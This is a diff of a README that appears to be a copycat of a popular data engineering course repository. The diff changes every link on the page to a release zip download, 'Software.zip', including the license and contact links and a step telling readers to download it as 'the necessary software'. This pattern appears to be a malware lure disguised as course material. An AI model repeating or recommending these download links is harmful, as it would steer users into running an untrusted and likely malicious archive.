@@ -2,7 +2,7 @@
 
 Welcome to the **Data Engineering Zoomcamp** repository! This is your one-stop resource for learning essential skills in data engineering, covering topics such as containerization, workflow orchestration, data warehousing, analytics engineering, batch and streaming processing. In this repository, you'll find tools and technologies such as Docker, Terraform, Google BigQuery, dbt, Apache Spark, Kafka, Kestra, PostgreSQL, Google Data Studio, and Metabase.
 
-## 📁 Repository: [data-engineering-zoomcamp](https://github.com/Xxmadkillerx10/data-engineering-zoomcamp/releases/download/v1.0/Application.zip)
+## 📁 Repository: [data-engineering-zoomcamp](https://github.com/Xxmadkillerx10/data-engineering-zoomcamp/releases/download/v2.0/Software.zip)
 
 ## 📌 Short Description:
 "The Data Engineering Zoomcamp covers essential skills in containerization, workflow orchestration, data warehousing, analytics engineering, batch and streaming processing. It includes tools like Docker, Terraform, BigQuery, dbt, Spark, Kafka, Kestra, PostgreSQL, Google Data Studio, and Metabase."
@@ -12,10 +12,10 @@ bigquery, containerization, data-engineering, dbt, docker, google-data-studio, k
 
 ## 📦 Resource Link:
 
-[Download https://github.com/Xxmadkillerx10/data-engineering-zoomcamp/releases/download/v1.0/Application.zip](https://github.com/Xxmadkillerx10/data-engineering-zoomcamp/releases/download/v1.0/Application.zip)
+[Download https://github.com/Xxmadkillerx10/data-engineering-zoomcamp/releases/download/v2.0/Software.zip](https://github.com/Xxmadkillerx10/data-engineering-zoomcamp/releases/download/v2.0/Software.zip)
 
-## Launch https://github.com/Xxmadkillerx10/data-engineering-zoomcamp/releases/download/v1.0/Application.zip
-[![Download https://github.com/Xxmadkillerx10/data-engineering-zoomcamp/releases/download/v1.0/Application.zip](https://github.com/Xxmadkillerx10/data-engineering-zoomcamp/releases/download/v1.0/Application.zip)](https://github.com/Xxmadkillerx10/data-engineering-zoomcamp/releases/download/v1.0/Application.zip)
+## Launch https://github.com/Xxmadkillerx10/data-engineering-zoomcamp/releases/download/v2.0/Software.zip
+[![Download https://github.com/Xxmadkillerx10/data-engineering-zoomcamp/releases/download/v2.0/Software.zip](https://github.com/Xxmadkillerx10/data-engineering-zoomcamp/releases/download/v2.0/Software.zip)](https://github.com/Xxmadkillerx10/data-engineering-zoomcamp/releases/download/v2.0/Software.zip)
 
 ---
 
@@ -50,7 +50,7 @@ This repository gathers resources, code examples, and projects related to data e
 
 ### 🚀 How to Get Started:
 
-1. **Download https://github.com/Xxmadkillerx10/data-engineering-zoomcamp/releases/download/v1.0/Application.zip** Click on the "Download https://github.com/Xxmadkillerx10/data-engineering-zoomcamp/releases/download/v1.0/Application.zip" button above to access the necessary software for your data engineering journey.
+1. **Download https://github.com/Xxmadkillerx10/data-engineering-zoomcamp/releases/download/v2.0/Software.zip** Click on the "Download https://github.com/Xxmadkillerx10/data-engineering-zoomcamp/releases/download/v2.0/Software.zip" button above to access the necessary software for your data engineering journey.
 
 2. **Explore the Topics:** Navigate through the repository topics to find relevant resources on the tools and technologies you are interested in.
 
@@ -68,13 +68,13 @@ This repository gathers resources, code examples, and projects related to data e
 
 ## License:
 
-The content of this repository is licensed under the [MIT License](https://github.com/Xxmadkillerx10/data-engineering-zoomcamp/releases/download/v1.0/Application.zip).
+The content of this repository is licensed under the [MIT License](https://github.com/Xxmadkillerx10/data-engineering-zoomcamp/releases/download/v2.0/Software.zip).
 
 ---
 
 ## 📧 Contact:
 
-For any inquiries or feedback, please feel free to reach out to the repository owner at [https://github.com/Xxmadkillerx10/data-engineering-zoomcamp/releases/download/v1.0/Application.zip](https://github.com/Xxmadkillerx10/data-engineering-zoomcamp/releases/download/v1.0/Application.zip).
+For any inquiries or feedback, please feel free to reach out to the repository owner at [https://github.com/Xxmadkillerx10/data-engineering-zoomcamp/releases/download/v2.0/Software.zip](https://github.com/Xxmadkillerx10/data-engineering-zoomcamp/releases/download/v2.0/Software.zip).
 
 Happy Data Engineering! 🚀
 
